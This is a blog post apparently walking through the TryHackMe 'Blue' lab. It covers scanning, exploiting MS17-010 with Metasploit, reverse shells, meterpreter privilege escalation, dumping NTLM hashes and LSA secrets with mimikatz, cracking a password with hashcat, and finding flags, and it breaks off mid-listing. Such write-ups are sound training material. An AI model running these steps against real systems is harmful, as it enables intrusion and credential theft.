<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Blue | .burso | blog about ctf & anything else</title><meta name=keywords content="ctf,eternalblue,hashcat,metasploit,MS17-010,tryhackme"><meta name=description content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows   Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010)."><meta name=author content="Matus Bursa"><link rel=canonical href=https://burso.eu/posts/blue/><link crossorigin=anonymous href=/assets/css/stylesheet.min.b4e19c453811e60acfec1f00c15ac2be1c53f6ab90187e684358ce7faaf48bab.css integrity="sha256-tOGcRTgR5grP7B8AwVrCvhxT9quQGH5oQ1jOf6r0i6s=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://burso.eu/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://burso.eu/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://burso.eu/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://burso.eu/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://burso.eu/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Blue"><meta property="og:description" content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows   Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010)."><meta property="og:type" content="article"><meta property="og:url" content="https://burso.eu/posts/blue/"><meta property="og:image" content="https://burso.eu/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-02-12T14:35:31+01:00"><meta property="article:modified_time" content="2020-02-12T14:35:31+01:00"><meta property="og:site_name" content=".burso"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://burso.eu/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Blue"><meta name=twitter:description content="Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let&rsquo;s start with nmap scan.
$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows   Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010)."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://burso.eu/posts/"},{"@type":"ListItem","position":2,"name":"Blue","item":"https://burso.eu/posts/blue/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Blue","name":"Blue","description":"Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let\u0026rsquo;s start with nmap scan.\n$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows   Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010).","keywords":["ctf","eternalblue","hashcat","metasploit","MS17-010","tryhackme"],"articleBody":"Hello everyone, today we look at the CTF with MS17-010 vulnerability. So let’s start with nmap scan.\n$ nmap -sV -p0-1000 --script vuln 10.10.223.243 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET Nmap scan report for 10.10.223.243 Host is up (0.043s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows   Host script results: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds How many ports are open with a port number under 1000?:\n 3  What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)\n ms17-010  MS17-010 is very unstable exploit, it doesn’t work in my linux or macos machine. But it works in my android with termux app. You can also buy PRO account and use their own kali machine. So now I connect to my android phone and then we will continue to exploit server\n$ ssh 192.168.xx.yy -p8022 -lxxx_yyy Welcome to Termux!  Wiki: https://wiki.termux.com Community forum: https://termux.com/community Gitter chat: https://gitter.im/termux/termux IRC channel: #termux on freenode  Working with packages:   * Search packages: pkg search   * Install a package: pkg install   * Upgrade packages: pkg upgrade  Subscribing to additional repositories:   * Root: pkg install root-repo  * Unstable: pkg install unstable-repo  * X11: pkg install x11-repo  Report issues at https://termux.com/issues  $ Now we can continue as on any other devices, so let’s start metasploit\nUnable to handle kernel NULL pointer dereference at virtual address 0xd34db33f EFLAGS: 00010046 eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001 esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60 ds: 0018 es: 0018 ss: 0018 Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)   Stack: 90909090990909090990909090  90909090990909090990909090  90909090.90909090.90909090  90909090.90909090.90909090  90909090.90909090.09090900  90909090.90909090.09090900  ..........................  cccccccccccccccccccccccccc  cccccccccccccccccccccccccc  ccccccccc.................  cccccccccccccccccccccccccc  cccccccccccccccccccccccccc  .................ccccccccc  cccccccccccccccccccccccccc  cccccccccccccccccccccccccc  ..........................  ffffffffffffffffffffffffff  ffffffff..................  ffffffffffffffffffffffffff  ffffffff..................  ffffffff..................  ffffffff..................   Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00 Aiee, Killing Interrupt handler Kernel panic: Attempted to kill the idle task! In swapper task - not syncing    =[ metasploit v5.0.79-dev ] + -- --=[ 1979 exploits - 1087 auxiliary - 339 post ] + -- --=[ 559 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ]  msf5  search ms17-010  Matching Modules ================   # Name Disclosure Date Rank Check Description  - ---- --------------- ---- ----- -----------  0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution  1 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection  2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption  3 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+  4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution  5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)\n exploit/windows/smb/ms17_010_eternalblue  msf5  use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue)  show options  Module options (exploit/windows/smb/ms17_010_eternalblue):   Name Current Setting Required Description  ---- --------------- -------- -----------  RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:'  RPORT 445 yes The target port (TCP)  SMBDomain . no (Optional) The Windows domain to use for authentication  SMBPass no (Optional) The password for the specified username  SMBUser no (Optional) The username to authenticate as  VERIFY_ARCH true yes Check if remote architecture matches exploit Target.  VERIFY_TARGET true yes Check if remote OS matches exploit Target.   Exploit target:   Id Name  -- ----  0 Windows 7 and Server 2008 R2 (x64) All Service Packs   msf5 exploit(windows/smb/ms17_010_eternalblue)  set RHOSTS 10.10.223.243 Show options and set the one required value. What is the name of this value? (All caps for submission)\n RHOSTS  msf5 exploit(windows/smb/ms17_010_eternalblue)  exploit  [*] Started reverse TCP handler on 10.8.11.158:4444 [*] 10.10.223.243:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.223.243:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.223.243:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.223.243:445 - Connecting to target for exploitation. [+] 10.10.223.243:445 - Connection established for exploitation. [+] 10.10.223.243:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.223.243:445 - CORE raw buffer dump (42 bytes) [*] 10.10.223.243:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.223.243:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.223.243:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.223.243:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.223.243:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.223.243:445 - Sending all but last fragment of exploit packet [*] 10.10.223.243:445 - Starting non-paged pool grooming [+] 10.10.223.243:445 - Sending SMBv2 buffers [+] 10.10.223.243:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.223.243:445 - Sending final SMBv2 buffers. [*] 10.10.223.243:445 - Sending last fragment of exploit packet! [*] 10.10.223.243:445 - Receiving response from exploit packet [+] 10.10.223.243:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.223.243:445 - Sending egg to corrupted connection. [*] 10.10.223.243:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.11.158:4444 - 10.10.223.243:49187) at 2020-03-20 11:49:18 +0100 [+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=     C:\\Windows\\system32 Okey, we’re in, so let’s background the process and migrate shell to meterpreter\nC:\\Windows\\system32^Z Background session 1? [y/N] y msf5 exploit(windows/smb/ms17_010_eternalblue)  use post/multi/manage/shell_to_meterpreter If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)\n post/multi/manage/shell_to_meterpreter  msf5 post(multi/manage/shell_to_meterpreter)  show options  Module options (post/multi/manage/shell_to_meterpreter):   Name Current Setting Required Description  ---- --------------- -------- -----------  HANDLER true yes Start an exploit/multi/handler to receive the connection  LHOST no IP of host that will receive the connection from the payload (Will try to auto detect).  LPORT 4433 yes Port for payload to connect to.  SESSION yes The session to run this module on. Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)\n SESSION  msf5 post(multi/manage/shell_to_meterpreter)  show sessions  Active sessions ===============   Id Name Type Information Connection  -- ---- ---- ----------- ----------  1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.11.158:4444 - 10.10.223.243:49187 (10.10.223.243) msf5 post(multi/manage/shell_to_meterpreter)  set SESSION 1 SESSION = 1 msf5 post(multi/manage/shell_to_meterpreter)  run  [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.11.158:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter)  [*] Sending stage (180291 bytes) to 10.10.223.243 [*] Meterpreter session 2 opened (10.8.11.158:4433 - 10.10.223.243:49197) at 2020-03-20 11:57:43 +0100 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter)  show sessions  Active sessions ===============   Id Name Type Information Connection  -- ---- ---- ----------- ----------  1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.11.158:4444 - 10.10.223.243:49187 (10.10.223.243)  2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.11.158:4433 - 10.10.223.243:49197 (10.10.223.243) Migrating shell to meterpreter was successful, so we have 2 sessions now. Let’s run the second one, the meterpreter session and migrate process to another process id.\nmsf5 post(multi/manage/shell_to_meterpreter)  sessions 2 [*] Starting interaction with 2...  meterpreter  getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter  ps  Process List ============   PID PPID Name Arch Session User Path  --- ---- ---- ---- ------- ---- ----  0 0 [System Process]  4 0 System x64 0  416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe  428 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe  560 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe  564 556 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe  612 556 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe  624 604 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe  664 604 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe  712 612 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe  720 612 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe  724 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe  728 612 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe  836 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe  904 712 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe  952 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe  1020 664 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\LogonUI.exe  1128 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe  1184 1348 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe  1204 712 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe  1348 712 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe  1384 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe  1448 712 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe  1524 712 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe  1664 712 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe  1996 712 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe  2084 712 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe  2240 2920 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe  2368 2240 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe  2396 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe  2404 712 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe  2556 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe  2572 712 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe  2604 712 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe  2716 712 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchIndexer.exe  2916 564 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe  2920 2400 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  2996 2240 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe meterpreter  migrate 712 [*] Migrating from 2240 to 712... [*] Migration completed successfully. Yeah, migration was succesful, so we can dump the hashes of users passwords.\nmeterpreter  hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter  load kiwi Loading extension kiwi...  .#####. mimikatz 2.2.0 20191125 (x64/windows)  .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo)  ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  ## \\ / ##  http://blog.gentilkiwi.com/mimikatz  '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )  '#####'  http://pingcastle.com / http://mysmartlogon.com ***/  Success. meterpreter  lsa_dump_sam [+] Running as SYSTEM [*] Dumping SAM Domain : JON-PC SysKey : 55bd17830e678f18a3110daf2c17d4c7 Local SID : S-1-5-21-2633577515-2458672280-487782642  SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e  RID : 000001f4 (500) User : Administrator  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0  RID : 000001f5 (501) User : Guest  RID : 000003e8 (1000) User : Jon  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d  meterpreter  lsa_dump_secrets [+] Running as SYSTEM [*] Dumping LSA secrets Domain : JON-PC SysKey : 55bd17830e678f18a3110daf2c17d4c7  Local name : Jon-PC ( S-1-5-21-2633577515-2458672280-487782642 ) Domain name : WORKGROUP  Policy subsystem is : 1.11 LSA Key(s) : 1, default {888e8eec-afc6-d204-0da2-a847caf129ea}  [00] {888e8eec-afc6-d204-0da2-a847caf129ea} c3c1bfae498011d6dd37f2710cc970a5e2d80f0e17e6c12237abaaceed8ce04f  Secret : DefaultPassword old/text: CDCClubROX  Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 dc 31 ac 35 e1 9a 18 b0 0b 5b 06 6d e3 e8 da 89 8b f8 da 71 fa ea 74 03 f4 2b 58 e1 a5 dd 35 ee 81 61 85 a9 53 b1 c7 95  full: dc31ac35e19a18b00b5b066de3e8da898bf8da71faea7403f42b58e1a5dd35ee816185a953b1c795  m/u : dc31ac35e19a18b00b5b066de3e8da898bf8da71 / faea7403f42b58e1a5dd35ee816185a953b1c795 old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 01 61 be bf d4 bc 70 54 70 fd df 46 12 a8 c5 e5 2d 98 6c 79 71  full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971  m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971  Secret : NL$KM cur/hex : 45 94 4a 93 a2 9d d2 8e 2b cf 5f df 66 75 59 4c e9 bc b8 91 2c 66 59 1e bf 53 1e 77 be c2 9b 74 73 64 04 b4 56 ea 7d 6f ba c2 1b 7e f0 ba 53 67 e6 e6 66 84 95 1f 90 60 42 ee 34 0a ee 99 9f 55 Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?\n Jon  Now we can crack the hashes. It doesn’t care if we use john-the-ripper or hashcat.\n$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d'  hashes.txt $ hashcat -m 1000 -O hashes.txt /usr/local/share/wordlists/rockyou.txt Dictionary cache hit: * Filename..: /usr/local/share/wordlists/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384  ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22  Session..........: hashcat Status...........: Cracked Hash.Type........: NTLM Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d Time.Started.....: Fri Mar 20 16:12:30 2020 (3 secs) Time.Estimated...: Fri Mar 20 16:12:33 2020 (0 secs) Guess.Base.......: File (/usr/local/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 3946.0 kH/s (7.80ms) @ Accel:64 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10223616/14344384 (71.27%) Rejected.........: 0/10223616 (0.00%) Restore.Point....: 10027008/14344384 (69.90%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#2....: april669 - alisonodonnell1  Started: Fri Mar 20 16:12:27 2020 Stopped: Fri Mar 20 16:12:34 2020 Copy this password hash to a file and research how to crack it. What is the cracked password?\n alqfna22  meterpreter  cd C:/ meterpreter  pwd C:\\ meterpreter  ls Listing: C:\\ ============  Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-14 05:18:56 +0200 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 07:08:56 +0200 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-14 05:20:08 +0200 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-14 05:20:08 +0200 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-14 05:20:08 +0200 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-14 05:20:08 +0200 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-13 04:13:22 +0100 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-13 00:01:17 +0100 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-14 05:20:08 +0200 Users 40777/rwxrwxrwx 16384 dir 2009-07-14 05:20:08 +0200 Windows 100666/rw-rw-rw- 24 fil 2018-12-13 04:47:39 +0100 flag1.txt 0000/--------- 3089184 fif 1970-02-07 00:26:08 +0100 hiberfil.sys 0000/--------- 3089184 fif 1970-02-07 00:26:08 +0100 pagefile.sys  meterpreter  cat flag1.txt flag{access_the_machine} Flag1? (Only submit the flag contents {CONTENTS})\n access_the_machine  For final steps, we return back to first session with basic command shell.\nmeterpreter  Background session 2? [y/N] msf5 post(multi/manage/shell_to_meterpreter)  msf5 post(multi/manage/shell_to_meterpreter)  sessions 1 [*] Starting interaction with 1...      Name : ConsoleHost Version : 2.0 InstanceId : 6ab0de61-c602-4a6d-93f5-77a4f1f1c239 UI : System.Management.Automation.Internal.Host.InternalHostUserI  nterface CurrentCulture : en-US CurrentUICulture : en-US PrivateData : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy IsRunspacePushed : False Runspace : System.Management.Automation.Runspaces.LocalRunspace    TJACJVXvCYTTfrcbvutJpyWlidgPcITh  C:\\Windows\\system32cd C:\\ cd C:\\  C:\\dir flag* /s /p dir flag* /s /p  Volume in drive C has no label.  Volume Serial Number is E611-0B66   Directory of C:\\  03/17/2019 02:27 PM 24 flag1.txt  1 File(s) 24 bytes   Directory of C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent  03/17/2019 02:26 PM 482 flag1.lnk 03/17/2019 02:30 PM 848 flag2.lnk 03/17/2019 02:32 PM 2,344 flag3.lnk  3 File(s) 3,674 bytes   Directory of C:\\Users\\Jon\\Documents  03/17/2019 02:26 PM 37 flag3.txt  1 File(s) 